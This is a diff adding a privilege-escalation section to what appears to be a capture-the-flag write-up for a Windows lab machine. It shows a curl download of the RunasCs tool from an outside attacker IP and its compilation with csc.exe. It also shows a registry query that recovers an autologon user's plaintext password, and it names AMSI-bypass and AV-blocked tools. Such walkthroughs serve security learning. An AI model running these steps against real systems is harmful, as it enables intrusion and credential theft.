@@ -368,7 +368,83 @@ dir
 C:\Users\hugo\Desktop>type user.txt
 type user.txt
 THM{WITH_GREAT_POWER_COMES_GREAT_RESPONSIBILITY}
-C:\Users\hugo\Desktop>net user
-net user
+
+This machine is a windows with AV protection so, the:
+
+**** PowerUp.ps1, disable AMSI, and p0wny **** Will not Work and i also
+
+### Privilage Escalation
+
+PS C:\Users\hugo\desktop> curl http://10.9.30.202/runAsCs.cs -o runAsCs.cs
+curl http://10.9.30.202/runAsCs.cs -o runAsCs.cs
+
+PS C:\users\hugo\desktop> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs
+
+Microsoft (R) Visual C# Compiler version 4.8.3761.0
+for C# 5
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240
+
+PS C:\users\hugo\desktop> dir
+dir
+
+
+    Directory: C:\users\hugo\desktop
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website                                                  
+-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website                                   
+-a----        9/18/2024   8:28 AM           3684 Get-Information.ps1                                                   
+-a----        9/18/2024   8:20 AM            825 Get-WebCredentials.ps1                                                
+-a----        9/18/2024   9:17 AM          96846 runAsCs.cs                                                            
+-a----        9/18/2024   9:20 AM          51712 RunasCs.exe                                                           
+-a----        7/25/2023   2:14 PM             48 user.txt                                                              
+-a----        9/18/2024   8:18 AM            825 x.ps1                                                                 
+
+
+PS C:\users\hugo\desktop> 
+
+**GET hugo password**
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+    AutoRestartShell    REG_DWORD    0x1
+    Background    REG_SZ    0 0 0
+    CachedLogonsCount    REG_SZ    10
+    DebugServerCommand    REG_SZ    no
+    DisableBackButton    REG_DWORD    0x1
+    EnableSIHostIntegration    REG_DWORD    0x1
+    ForceUnlockLogon    REG_DWORD    0x0
+    LegalNoticeCaption    REG_SZ    
+    LegalNoticeText    REG_SZ    
+    PasswordExpiryWarning    REG_DWORD    0x5
+    PowerdownAfterShutdown    REG_SZ    0
+    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
+    ReportBootOk    REG_SZ    1
+    Shell    REG_SZ    explorer.exe
+    ShellCritical    REG_DWORD    0x0
+    ShellInfrastructure    REG_SZ    sihost.exe
+    SiHostCritical    REG_DWORD    0x0
+    SiHostReadyTimeOut    REG_DWORD    0x0
+    SiHostRestartCountLimit    REG_DWORD    0x0
+    SiHostRestartTimeGap    REG_DWORD    0x0
+    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
+    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
+    WinStationsDisabled    REG_SZ    0
+    scremoveoption    REG_SZ    0
+    DisableCAD    REG_DWORD    0x1
+    LastLogOffEndTimePerfCounter    REG_QWORD    0x4f6c9151
+    ShutdownFlags    REG_DWORD    0x13
+    AutoAdminLogon    REG_SZ    1
+    DefaultUserName    REG_SZ    hugo
+    **DefaultPassword    REG_SZ    SurpriseMF123!**
+    AutoLogonSID    REG_SZ    S-1-5-21-1966530601-3185510712-10604624-1008
+    LastUsedUsername    REG_SZ    hugo
+    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe
+
 
 
